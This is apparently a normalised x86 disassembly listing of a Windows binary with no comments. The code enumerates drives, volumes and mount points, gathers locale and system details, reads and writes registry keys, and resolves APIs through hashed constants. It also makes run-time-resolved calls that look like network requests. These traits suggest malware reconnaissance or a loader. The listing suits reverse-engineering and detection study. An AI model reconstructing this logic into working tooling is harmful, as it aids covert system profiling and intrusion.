mov [ rw-data ] eax
ja r-xdata
call sub_40f29b
mov eax 0x708
call sub_40ecf5
call sub_4135da
cmp eax 0xc800000
jbe r-xdata
sub_413a4f
push ebp
mov ebp esp
sub esp 0x45c
push esi
push edi
push [ ebp + 0x8 ]
call [ GetDriveTypeW@IAT ]
cmp eax 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x20c ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x20c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x45c ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call [ FindFirstFileW@IAT ]
mov esi [ Sleep@IAT ]
push 0xa
mov edi eax
call esi
push 0x0
call esi
cmp edi 0xffffffff
je r-xdata
cmp eax 0x4
je r-xdata
xor al al
jmp r-xdata
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x45c ]
call sub_4138a4
pop ecx
push 0xa
call esi
push 0x0
call esi
lea eax [ ebp - 0x45c ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
cmp eax 0x3
je r-xdata
pop edi
pop esi
leave
retn
push edi
call [ FindClose@IAT ]
mov al 0x1
test eax eax
je r-xdata
sub_413afb
mov eax [ rw-data ]
mov ecx [ eax + 0x4 ]
push esi
shr ecx 0x2
xor esi esi
test ecx ecx
jle r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
pop esi
sete al
retn
mov eax [ eax ]
push [ eax + esi * 4 ]
call sub_413a4f
mov eax [ rw-data ]
pop ecx
mov ecx [ eax + 0x4 ]
inc esi
shr ecx 0x2
cmp esi ecx
jl r-xdata
sub_413b36
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41af24
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x294
push esi
push edi
push 0x80beaa2a
push [ ebp + 0x8 ]
mov eax 0x70243101
lea ecx [ esp + 0x40 ]
call sub_40c11a
and [ esp + 0x2a4 ] 0x0
lea esi [ esp + 0x8 ]
call sub_40c9fb
mov [ esp + 0x2a4 ] 0x1
lea esi [ esp + 0x18 ]
call sub_40c9fb
mov [ esp + 0x2a4 ] 0x3
lea esi [ esp + 0x28 ]
call sub_40c9fb
mov [ esp + 0x2a4 ] 0x5
jmp r-xdata
lea eax [ esp + 0x38 ]
call sub_40c0aa
test al al
je r-xdata
push 0x3c
pop eax
call sub_40ecf5
lea eax [ esp + 0x18 ]
mov [ rw-data ] eax
lea eax [ esp + 0x28 ]
mov [ rw-data ] eax
lea eax [ esp + 0x38 ]
mov [ rw-data ] eax
call sub_4135f5
call sub_4135da
lea eax [ esp + 0x8 ]
lea ecx [ esp + 0x38 ]
call sub_40c1af
mov edi rw-data
push edi
lea eax [ esp + 0xc ]
call sub_410170
lea esi [ esp + 0x8 ]
call sub_40c90c
mov esi [ Sleep@IAT ]
call sub_413afb
test al al
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
push eax
mov [ rw-data ] eax
mov [ rw-data ] ecx
call sub_40ca1c
push 0xa
call esi
push 0x0
call esi
mov edx edi
lea ecx [ esp + 0x38 ]
call sub_40c257
mov eax 0x1c20
call sub_40ecf5
jmp r-xdata
call sub_413701
jmp r-xdata
sub_413c5c
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x634
push ebx
push esi
push edi
xor esi esi
push r--data
mov [ esp + 0x14 ] esi
mov [ esp + 0x1c ] esi
call sub_40d8aa
mov [ esp + 0x14 ] eax
cmp eax esi
jne r-xdata
mov ecx [ esp + 0x14 ]
push 0x55a
push rw-data
call sub_40ddc7
test al al
je r-xdata
call sub_40d957
mov [ esp + 0x14 ] eax
cmp eax esi
je r-xdata
push [ esp + 0x14 ]
call sub_412d05
push [ esp + 0x10 ]
call sub_412d05
push [ esp + 0x18 ]
call sub_412d05
mov al 0x1
jmp r-xdata
push esi
push r--data
push [ esp + 0x1c ]
call sub_40dbf0
mov [ esp + 0x10 ] eax
cmp eax esi
je r-xdata
push esi
call sub_412d05
push esi
call sub_412d05
push esi
call sub_412d05
xor al al
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push r--data
call sub_4102c5
push eax
call sub_40dbf0
mov [ esp + 0x18 ] eax
cmp eax esi
jne r-xdata
mov ebx [ lstrcpyW@IAT ]
push r--data
lea eax [ esp + 0x43c ]
push eax
call ebx
push [ esp + 0x18 ]
mov edi [ lstrcatW@IAT ]
lea eax [ esp + 0x43c ]
push eax
call edi
push r--data
lea eax [ esp + 0x43c ]
push eax
call edi
push 0x4
lea esi [ esp + 0x24 ]
call sub_40edc9
mov eax esi
push eax
lea eax [ esp + 0x43c ]
push eax
call edi
mov esi [ lstrlenW@IAT ]
lea eax [ esp + 0x438 ]
push eax
call esi
lea ecx [ eax + eax + 0x2 ]
xor edx edx
mov eax r--data
cmp edx eax
je r-xdata
call sub_4102c5
mov edi eax
call sub_40e7b9
mov [ esp + 0x18 ] eax
push r--data
lea eax [ esp + 0x234 ]
push eax
call ebx
push r--data
lea eax [ esp + 0x234 ]
push eax
call edi
push r--data
call esi
lea ecx [ esp + 0x230 ]
lea eax [ eax + eax + 0x2 ]
test ecx ecx
je r-xdata
push ecx
lea ecx [ esp + 0x43c ]
push ecx
push 0x3
push r--data
push eax
push 0x80000002
call sub_40c46e
lea eax [ esp + 0x230 ]
push eax
lea eax [ esp + 0x2c ]
push eax
call ebx
push r--data
lea eax [ esp + 0x2c ]
push eax
call edi
push [ esp + 0x10 ]
call esi
lea ecx [ esp + 0x28 ]
lea eax [ eax + eax + 0x2 ]
test ecx ecx
je r-xdata
push eax
push r--data
push 0x1
push 0x0
mov eax ecx
push eax
push 0x80000000
call sub_40c46e
push r--data
call esi
lea ecx [ esp + 0x28 ]
lea eax [ eax + eax + 0x2 ]
test ecx ecx
je r-xdata
push eax
push [ esp + 0x14 ]
mov eax ecx
push 0x1
push 0x0
push eax
push 0x80000000
call sub_40c46e
lea eax [ esp + 0x230 ]
push eax
lea eax [ esp + 0x2c ]
push eax
call ebx
push r--data
lea eax [ esp + 0x2c ]
push eax
call edi
push r--data
call esi
lea ecx [ esp + 0x28 ]
lea eax [ eax + eax + 0x2 ]
test ecx ecx
je r-xdata
push eax
push r--data
push 0x1
push r--data
mov eax ecx
push eax
push 0x80000000
call sub_40c46e
lea eax [ esp + 0x230 ]
push eax
lea eax [ esp + 0x2c ]
push eax
call ebx
push r--data
lea eax [ esp + 0x2c ]
push eax
call edi
push r--data
call esi
lea ecx [ esp + 0x28 ]
lea eax [ eax + eax + 0x2 ]
test ecx ecx
je r-xdata
push eax
push r--data
push 0x1
push 0x0
mov eax ecx
push eax
push 0x80000000
call sub_40c46e
push r--data
lea eax [ esp + 0x2c ]
push eax
call ebx
push r--data
lea eax [ esp + 0x2c ]
push eax
call edi
mov edi r--data
push edi
call esi
lea ecx [ esp + 0x28 ]
lea eax [ eax + eax + 0x2 ]
test ecx ecx
je r-xdata
push eax
push r--data
push 0x1
push 0x0
mov eax ecx
push eax
push 0x80000000
call sub_40c46e
lea eax [ esp + 0x28 ]
mov [ esp + 0x1c ] 0x1
test eax eax
je r-xdata
push eax
push edi
push 0x1
push 0x0
mov eax ecx
push eax
push 0x80000002
call sub_40c46e
push 0x4
lea eax [ esp + 0x20 ]
push eax
push 0x4
push r--data
lea eax [ esp + 0x38 ]
push eax
push 0x80000002
call sub_40c46e
sub_413f6d
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
push 0x368
lea edi [ esi + 0x8 ]
push 0x0
push edi
mov [ ebp - 0x4 ] 0x100
call sub_405830
add esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
leave
retn
push edi
push r--data
push [ ebp + 0x8 ]
mov ebx 0x80000002
push ebx
lea edi [ ebp - 0x4 ]
call sub_40c4dc
test al al
je r-xdata
cmp [ esi + 0x370 ] 0x0
je r-xdata
lea eax [ esi + 0x108 ]
push eax
push r--data
push [ ebp + 0x8 ]
lea edi [ ebp - 0x4 ]
push ebx
mov [ ebp - 0x4 ] 0x40
call sub_40c4dc
lea eax [ esi + 0x148 ]
push eax
push r--data
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x208
push ebx
call sub_40c4dc
lea eax [ esi + 0x350 ]
push eax
push r--data
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x20
push ebx
call sub_40c4dc
lea eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
mov edi 0x368
call sub_40cb2c
inc [ esi + 0x374 ]
jmp r-xdata
sub_414036
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41abfd
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x1774
call sub_406c70
push ebx
push esi
push edi
lea esi [ esp + 0x20 ]
call sub_40c9fb
xor ebx ebx
mov [ esp + 0x178c ] ebx
lea esi [ esp + 0x3c ]
call sub_40c9fb
mov [ esp + 0x178c ] 0x1
lea esi [ esp + 0x20 ]
call sub_40c90c
push 0x45c
lea eax [ esp + 0x57c ]
push ebx
push eax
call sub_405830
add esp 0xc
push 0x100
lea eax [ esp + 0x594 ]
push eax
push ebx
call [ GetModuleFileNameW@IAT ]
call sub_40e9e9
mov [ esp + 0x580 ] eax
cmp [ rw-data ] ebx
jne r-xdata
mov eax rw-data
call sub_41030a
jmp r-xdata
mov eax [ esp + 0x6c ]
mov [ esp + 0x34 ] eax
mov eax [ esp + 0x70 ]
mov [ esp + 0x38 ] eax
lea eax [ esp + 0x34 ]
push eax
push eax
call [ FileTimeToLocalFileTime@IAT ]
lea eax [ esp + 0x9a8 ]
push eax
lea eax [ esp + 0x38 ]
push eax
call [ FileTimeToSystemTime@IAT ]
mov eax [ esi + 0x2b78 ]
add eax [ esi + 0x4e7c ]
mov edi 0x45c
mov [ esp + 0x9d0 ] eax
lea eax [ esp + 0x578 ]
push eax
lea eax [ esp + 0x24 ]
call sub_40cb2c
mov [ esp + 0xc ] ebx
cmp [ esi + 0x2b78 ] ebx
jbe r-xdata
push ebx
push 0x1c
lea ecx [ esp + 0x74 ]
push ecx
push 0x3
call eax
mov edi [ lstrcpynW@IAT ]
push 0x40
push eax
lea eax [ esp + 0x8a0 ]
push eax
call edi
mov esi [ ebp + 0x8 ]
push 0x40
push esi
call sub_40d32b
push eax
lea eax [ esp + 0x920 ]
push eax
call edi
mov eax esi
call sub_40c680
mov edi esi
mov [ esp + 0x584 ] eax
call sub_412ae3
push esi
mov [ esp + 0x580 ] eax
call sub_40d0df
mov [ esp + 0x578 ] eax
call [ GetACP@IAT ]
mov [ esp + 0x588 ] eax
call [ GetOEMCP@IAT ]
mov [ esp + 0x58c ] eax
lea eax [ esp + 0x690 ]
push eax
push 0x208
call [ GetCurrentDirectoryW@IAT ]
lea eax [ esp + 0x9b8 ]
push eax
call [ GetKeyboardLayoutNameW@IAT ]
lea eax [ esp + 0x998 ]
push eax
call [ GetLocalTime@IAT ]
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov [ esp + 0xc ] ebx
cmp [ esi + 0x4e7c ] ebx
jbe r-xdata
lea eax [ esi + 0x87c ]
mov [ esp + 0x10 ] eax
lea esi [ esp + 0x5c ]
call sub_40c9fb
mov [ esp + 0x178c ] 0x2
lea esi [ esp + 0x4c ]
call sub_40c9fb
mov [ esp + 0x178c ] 0x3
push 0x104
lea eax [ esp + 0x374 ]
push eax
mov [ esp + 0x14 ] ebx
call [ FindFirstVolumeW@IAT ]
mov [ esp + 0x10 ] eax
cmp eax 0xffffffff
je r-xdata
lea eax [ esi + 0x2b80 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x10 ]
mov eax [ eax ]
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x18 ]
push eax
push 0x4
pop edi
lea eax [ esp + 0x24 ]
call sub_40cb2c
inc [ esp + 0xc ]
mov eax [ esp + 0xc ]
add [ esp + 0x10 ] 0x118
cmp eax [ esi + 0x2b78 ]
jb r-xdata
push [ esp + 0xc ]
lea eax [ esp + 0x50 ]
push eax
call sub_40cccc
push [ esp + 0x4c ]
mov edi [ esp + 0x54 ]
lea eax [ esp + 0x24 ]
call sub_40cb2c
lea esi [ esp + 0x3c ]
call sub_40c90c
mov esi [ esp + 0x3c ]
push ebx
push [ esp + 0x44 ]
push esi
push 0x5
call [ rw-data ]
mov edi 0xc0000004
jmp r-xdata
call sub_40c90c
mov eax [ esp + 0x10 ]
mov eax [ eax ]
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x18 ]
push eax
push 0x4
pop edi
lea eax [ esp + 0x24 ]
call sub_40cb2c
inc [ esp + 0xc ]
mov eax [ esp + 0xc ]
add [ esp + 0x10 ] 0x118
cmp eax [ esi + 0x4e7c ]
jb r-xdata
cmp eax edi
je r-xdata
push 0x104
lea eax [ esp + 0x374 ]
push eax
push [ esp + 0x18 ]
call [ FindNextVolumeW@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x1c ]
push eax
push [ esp + 0x20 ]
lea eax [ esp + 0x378 ]
push [ esp + 0x64 ]
push eax
call edi
mov eax [ esp + 0x60 ]
cmp eax 0x8
jbe r-xdata
push 0x1
push 0x1e0
lea esi [ esp + 0x44 ]
call sub_40c865
mov esi [ esp + 0x3c ]
push ebx
push [ esp + 0x44 ]
push esi
push 0x5
call [ rw-data ]
mov eax esi
mov [ esp + 0xc ] ebx
cmp [ esi ] ebx
je r-xdata
inc [ esp + 0xc ]
push 0x2e8
lea eax [ esp + 0x8c ]
push ebx
push eax
call sub_405830
add esp 0xc
lea eax [ esp + 0x370 ]
push eax
lea eax [ esp + 0x94 ]
push eax
call [ lstrcpyW@IAT ]
mov edi [ GetVolumePathNamesForVolumeNameW@IAT ]
lea eax [ esp + 0x1c ]
push eax
push ebx
push ebx
lea eax [ esp + 0x37c ]
push eax
mov [ esp + 0x2c ] ebx
call edi
lea esi [ esp + 0x5c ]
call sub_40c90c
mov eax [ esp + 0x1c ]
push 0x1
add eax eax
push eax
call sub_40c865
test al al
je r-xdata
push [ esp + 0x10 ]
call [ FindVolumeClose@IAT ]
push eax
push [ esp + 0x60 ]
lea eax [ esp + 0x90 ]
push eax
call [ lstrcpynW@IAT ]
lea eax [ esp + 0x88 ]
push eax
call [ GetDriveTypeW@IAT ]
mov [ esp + 0x298 ] eax
push ebx
lea eax [ esp + 0x36c ]
push eax
lea eax [ esp + 0x368 ]
push eax
lea eax [ esp + 0x94 ]
push eax
call [ GetDiskFreeSpaceExW@IAT ]
push 0x40
lea eax [ esp + 0x2a4 ]
push eax
lea eax [ esp + 0x38 ]
push eax
push ebx
lea eax [ esp + 0x2ac ]
push eax
push 0x80
lea eax [ esp + 0x2f8 ]
push eax
lea eax [ esp + 0x38c ]
push eax
call [ GetVolumeInformationW@IAT ]
lea eax [ esp + 0x88 ]
push eax
mov edi 0x2e8
lea eax [ esp + 0x50 ]
call sub_40cb2c
test [ esp + 0x30 ] 0x80
je r-xdata
push 0x8
pop eax
lea eax [ esp + 0xc ]
push eax
push 0x4
pop edi
lea eax [ esp + 0x24 ]
call sub_40cb2c
mov edi 0x210
push edi
lea eax [ esp + 0x9dc ]
push ebx
push eax
call sub_405830
add esp 0xc
jmp r-xdata
xor ecx ecx
push 0x104
lea eax [ esp + 0xf64 ]
push eax
lea eax [ esp + 0x378 ]
push eax
call [ FindFirstVolumeMountPointW@IAT ]
mov [ esp + 0x18 ] eax
cmp eax 0xffffffff
je r-xdata
cmp [ esp + 0xc ] ebx
ja r-xdata
cmp [ eax + 0x3c ] ebx
je r-xdata
push [ esp + 0x18 ]
call [ FindVolumeMountPointClose@IAT ]
mov esi [ lstrcpyW@IAT ]
inc [ esp + 0xc ]
lea eax [ esp + 0x88 ]
push eax
lea eax [ esp + 0x1374 ]
push eax
call esi
push edi
lea eax [ esp + 0x8c ]
push ebx
push eax
call sub_405830
add esp 0xc
mov eax [ esi + 0x3c ]
dec [ esp + 0xc ]
cmp eax ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ esp + 0x20 ]
mov [ esp + 0xbec ] eax
lea eax [ esp + 0xbe8 ]
push eax
push sub_413f6d
push ebx
push 0x1
mov esi r--data
push esi
mov edx 0x80000002
mov [ esp + 0xf70 ] ebx
mov [ esp + 0xf6c ] 0x1
mov [ esp + 0xbfc ] ecx
call sub_40c30b
lea eax [ esp + 0xf5c ]
push eax
push 0x4
pop edi
lea eax [ esp + 0x24 ]
call sub_40cb2c
mov ecx [ ebp + 0x8 ]
lea eax [ esp + 0xbe8 ]
push eax
push sub_413f6d
push ebx
push 0x1
push esi
mov edx 0x80000002
mov [ esp + 0xf6c ] bl
call sub_40c30b
mov edi [ esp + 0x24 ]
mov esi [ esp + 0x20 ]
push edi
push ebx
push 0xa
call sub_40ed22
push eax
push ebx
push 0x80f80001
push edi
push esi
mov esi [ ebp + 0x8 ]
call sub_40ffc9
mov [ esp + 0x17 ] al
mov [ esp + 0x178c ] 0x2
lea esi [ esp + 0x4c ]
call sub_40c938
mov [ esp + 0x178c ] 0x1
lea esi [ esp + 0x5c ]
call sub_40c938
mov [ esp + 0x178c ] bl
lea esi [ esp + 0x3c ]
call sub_40c938
or [ esp + 0x178c ] 0xffffffff
lea esi [ esp + 0x20 ]
call sub_40c938
mov ecx [ esp + 0x1784 ]
mov al [ esp + 0x17 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
add eax [ eax ]
cmp [ eax ] ebx
jne r-xdata
inc [ esp + 0xc ]
add ecx 0x1e0
lea eax [ esp + 0x88 ]
push eax
mov edi 0x2e8
lea eax [ esp + 0x50 ]
call sub_40cb2c
push 0x104
lea eax [ esp + 0xf64 ]
push eax
push [ esp + 0x20 ]
call [ FindNextVolumeMountPointW@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x1578 ]
push eax
lea eax [ esp + 0x94 ]
push eax
call esi
inc [ esp + 0xc ]
push 0x208
push eax
lea eax [ esp + 0x9e0 ]
push eax
call [ lstrcpynW@IAT ]
mov eax [ esi + 0x44 ]
mov [ esp + 0xbe0 ] eax
mov eax [ esi + 0x48 ]
mov [ esp + 0xbe4 ] eax
lea eax [ esp + 0x9d8 ]
push eax
lea eax [ esp + 0x24 ]
call sub_40cb2c
jmp r-xdata
cmp ecx [ esp + 0x40 ]
jae r-xdata
lea eax [ esp + 0x1370 ]
push eax
lea eax [ esp + 0x8c ]
push eax
call esi
mov edi [ lstrcatW@IAT ]
lea eax [ esp + 0xf60 ]
push eax
lea eax [ esp + 0x8c ]
push eax
call edi
lea eax [ esp + 0x88 ]
push eax
call [ GetDriveTypeW@IAT ]
mov [ esp + 0x298 ] eax
push ebx
lea eax [ esp + 0x36c ]
push eax
lea eax [ esp + 0x368 ]
push eax
lea eax [ esp + 0x94 ]
push eax
call [ GetDiskFreeSpaceExW@IAT ]
push 0x40
lea eax [ esp + 0x2a4 ]
push eax
lea eax [ esp + 0x38 ]
push eax
push ebx
lea eax [ esp + 0x2ac ]
push eax
push 0x80
lea eax [ esp + 0x2f8 ]
push eax
lea eax [ esp + 0x38c ]
push eax
call [ GetVolumeInformationW@IAT ]
lea eax [ esp + 0x370 ]
push eax
lea eax [ esp + 0x116c ]
push eax
call esi
lea eax [ esp + 0xf60 ]
push eax
lea eax [ esp + 0x116c ]
push eax
call edi
push 0x104
lea eax [ esp + 0x157c ]
push eax
lea eax [ esp + 0x1170 ]
push eax
call [ GetVolumeNameForVolumeMountPointW@IAT ]
test eax eax
je r-xdata
add esi [ esi ]
sub_41478f
push ebp
mov ebp esp
mov eax 0x1018
call sub_406c70
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov [ ebp - 0x5 ] bl
call sub_40c90c
push ebx
push ebx
push ebx
push 0x1
push r--data
call [ rw-data ]
mov [ ebp - 0x14 ] eax
cmp eax ebx
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
leave
retn
push 0x1
push 0x8000000
push 0x1
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call [ rw-data ]
mov esi eax
cmp esi ebx
je r-xdata
push [ ebp - 0x14 ]
call [ rw-data ]
push [ ebp + 0x20 ]
push esi
call [ rw-data ]
test eax eax
je r-xdata
push esi
call [ rw-data ]
push 0x2
push 0x2
push 0x80000000
push [ ebp + 0xc ]
push esi
call [ rw-data ]
mov [ ebp - 0x10 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x5 ] 0x1
cmp [ ebp - 0xc ] ebx
je r-xdata
mov edi [ ebp - 0xc ]
lea eax [ ebp - 0x1014 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_40cb2c
push [ ebp - 0x10 ]
call [ rw-data ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x200000
jl r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x1000
lea eax [ ebp - 0x1014 ]
push eax
push [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
call [ rw-data ]
test eax eax
je r-xdata
sub_414879
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41addb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x310
push ebx
push esi
push edi
lea esi [ esp + 0x30 ]
call sub_40c9fb
xor ebx ebx
mov [ esp + 0x324 ] ebx
lea eax [ esp + 0x50 ]
push eax
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
call sub_412634
mov [ esp + 0x324 ] 0x1
cmp [ rw-data ] ebx
jne r-xdata
mov [ esp + 0x2c ] ebx
mov [ esp + 0x13 ] bl
mov [ esp + 0x40 ] 0x40412402
push r--data
call sub_40f29b
mov ebx r--data
mov ecx eax
call sub_412df3
push r--data
mov [ rw-data ] eax
call sub_40f29b
mov ecx eax
call sub_412df3
push r--data
mov [ rw-data ] eax
call sub_40f29b
mov ecx eax
call sub_412df3
push r--data
mov [ rw-data ] eax
call sub_40f29b
mov ecx eax
call sub_412df3
push r--data
mov [ rw-data ] eax
call sub_40f29b
mov ecx eax
call sub_412df3
push r--data
mov [ rw-data ] eax
call sub_40f29b
mov ecx eax
call sub_412df3
push r--data
mov [ rw-data ] eax
call sub_40f29b
mov ecx eax
call sub_412df3
xor ecx ecx
mov [ rw-data ] eax
cmp [ rw-data ] ecx
je r-xdata
xor bl bl
lea eax [ esp + 0x14 ]
push eax
lea edi [ esp + 0x1c ]
mov esi ebx
mov [ esp + 0x18 ] 0x7c5d2258
call sub_412589
push [ esp + 0x18 ]
mov esi [ lstrcpyW@IAT ]
lea eax [ esp + 0x11c ]
push eax
call esi
push 0x80beaa2a
lea eax [ esp + 0x9c ]
push r--data
push eax
call [ wsprintfW@IAT ]
mov ebx [ lstrcatW@IAT ]
add esp 0xc
lea eax [ esp + 0x98 ]
push eax
lea eax [ esp + 0x11c ]
push eax
call ebx
lea eax [ esp + 0x118 ]
push eax
lea eax [ esp + 0x21c ]
push eax
call esi
lea eax [ esp + 0x14 ]
push eax
lea esi [ esp + 0x54 ]
mov [ esp + 0x18 ] 0xc422369
call sub_412589
push [ esp + 0x18 ]
lea eax [ esp + 0x11c ]
push eax
call ebx
mov eax [ ebp + 0x8 ]
call sub_40d34b
push edx
push eax
lea eax [ esp + 0xa0 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x10
lea eax [ esp + 0x98 ]
push eax
lea eax [ esp + 0x21c ]
push eax
call ebx
push [ esp + 0x18 ]
lea eax [ esp + 0x21c ]
push eax
call ebx
lea eax [ esp + 0x14 ]
push eax
mov [ esp + 0x18 ] 0xf22f2ed
call sub_412589
lea eax [ esp + 0x14 ]
push eax
lea esi [ esp + 0x2c ]
lea ecx [ esp + 0x54 ]
mov [ esp + 0x18 ] 0x11d0f59c
call sub_4125af
lea eax [ esp + 0x14 ]
push eax
lea edi [ esp + 0x20 ]
lea esi [ esp + 0x54 ]
mov [ esp + 0x18 ] 0x124a76f5
call sub_412589
lea eax [ esp + 0x14 ]
push eax
lea edi [ esp + 0x24 ]
mov [ esp + 0x18 ] 0x15289533
call sub_412589
lea eax [ esp + 0x14 ]
push eax
lea edi [ esp + 0x28 ]
mov [ esp + 0x18 ] 0x623397cf
call sub_412589
lea eax [ esp + 0x14 ]
push eax
lea esi [ esp + 0x4c ]
lea ecx [ esp + 0x54 ]
mov [ esp + 0x18 ] 0x7f4becad
call sub_4125af
lea eax [ esp + 0x14 ]
push eax
lea esi [ esp + 0x48 ]
lea ecx [ esp + 0x54 ]
mov [ esp + 0x18 ] 0x69b8e0a0
call sub_4125af
lea eax [ esp + 0x14 ]
push eax
lea edi [ esp + 0x50 ]
lea esi [ esp + 0x54 ]
mov [ esp + 0x18 ] 0x5288a31
call sub_412589
xor edi edi
mov [ esp + 0x324 ] cl
lea eax [ esp + 0x50 ]
push eax
call sub_4125f1
or [ esp + 0x324 ] 0xffffffff
lea esi [ esp + 0x30 ]
call sub_40c938
xor al al
cmp [ rw-data ] ecx
je r-xdata
mov ecx [ esp + 0x31c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push [ esp + 0x24 ]
lea eax [ esp + 0x11c ]
push [ esp + 0x24 ]
push [ esp + 0x24 ]
push [ esp + 0x34 ]
push [ esp + 0x28 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call sub_41478f
add esp 0x1c
test al al
je r-xdata
mov esi [ esp + 0x34 ]
mov [ esp + 0x13 ] 0x1
test esi esi
jne r-xdata
cmp [ rw-data ] ecx
je r-xdata
push [ esp + 0x24 ]
lea eax [ esp + 0x34 ]
push [ esp + 0x24 ]
push [ esp + 0x24 ]
push [ esp + 0x34 ]
push [ esp + 0x28 ]
push [ esp + 0x60 ]
push eax
call sub_41478f
add esp 0x1c
test al al
je r-xdata
mov esi [ esp + 0x34 ]
mov [ esp + 0x13 ] 0x1
test esi esi
jne r-xdata
mov edi [ ebp + 0x10 ]
jle r-xdata
cmp [ rw-data ] ecx
je r-xdata
cmp [ esp + 0x13 ] 0x0
jne r-xdata
mov esi [ esp + 0x34 ]
mov [ esp + 0x13 ] 0x1
mov bl [ esp + 0x13 ]
mov [ edi ] esi
jmp r-xdata
cmp esi [ edi ]
jge r-xdata
cmp [ rw-data ] ecx
je r-xdata
test esi esi
mov eax [ esp + 0x48 ]
imul eax eax 0x3e8
push eax
call [ Sleep@IAT ]
inc edi
cmp edi [ esp + 0x44 ]
jle r-xdata
mov [ esp + 0x324 ] 0x0
lea eax [ esp + 0x50 ]
push eax
call sub_4125f1
or [ esp + 0x324 ] 0xffffffff
lea esi [ esp + 0x30 ]
call sub_40c938
mov al bl
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
push [ esp + 0x24 ]
lea eax [ esp + 0x21c ]
push [ esp + 0x24 ]
xor esi esi
push [ esp + 0x24 ]
push [ esp + 0x34 ]
push [ esp + 0x28 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call sub_41478f
add esp 0x1c
test al al
je r-xdata
jmp r-xdata
push esi
push [ esp + 0x34 ]
push [ ebp + 0xc ]
call sub_406530
add esp 0xc
cmp eax ecx
je r-xdata
inc [ esp + 0x2c ]
mov eax [ esp + 0x2c ]
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x14 ]
push eax
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x7c ]
push eax
push ecx
call sub_4155b9
pop ecx
push eax
call sub_4154a1
mov [ esp + 0x324 ] 0x2
push eax
lea ebx [ esp + 0x54 ]
call sub_40157d
mov [ esp + 0x324 ] 0x1
lea eax [ esp + 0x74 ]
push eax
call sub_4125f1
mov eax [ esp + 0x58 ]
push 0xd
xor edx edx
pop ecx
div ecx
test eax eax
je r-xdata
inc [ rw-data ]
xor ebx ebx
sub_414d3f
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41ab2e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x38
push ebx
push esi
push edi
lea esi [ esp + 0x30 ]
call sub_40c9fb
xor edi edi
mov [ esp + 0x4c ] edi
lea esi [ esp + 0x20 ]
call sub_40c9fb
mov [ esp + 0x4c ] 0x1
mov eax r--data
cmp [ ebp + 0xc ] edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
mov [ ebp + 0xc ] eax
push 0x1
push 0x1000
lea esi [ esp + 0x38 ]
call sub_40c865
mov eax [ esp + 0x34 ]
mov [ esp + 0xc ] eax
cmp [ ebp + 0x8 ] edi
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ esp + 0xc ]
push 0x1
add eax 0x400
push eax
lea esi [ esp + 0x28 ]
call sub_40c865
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push r--data
push [ esp + 0x2c ]
call [ wsprintfW@IAT ]
add esp 0x10
mov ebx [ esp + 0x30 ]
push ebx
push [ ebp + 0xc ]
lea edi [ esp + 0x14 ]
push [ ebp + 0x8 ]
push 0x80000001
call sub_40c4dc
test al al
je r-xdata
mov edi [ esp + 0xc ]
push 0x1
lea eax [ edi + 0x400 ]
push eax
lea esi [ esp + 0x28 ]
call sub_40c865
lea eax [ ebx + 0x1 ]
mov [ esp + 0x14 ] eax
mov eax [ rw-data ]
xor ecx ecx
mov [ esp + 0x10 ] edi
cmp eax ecx
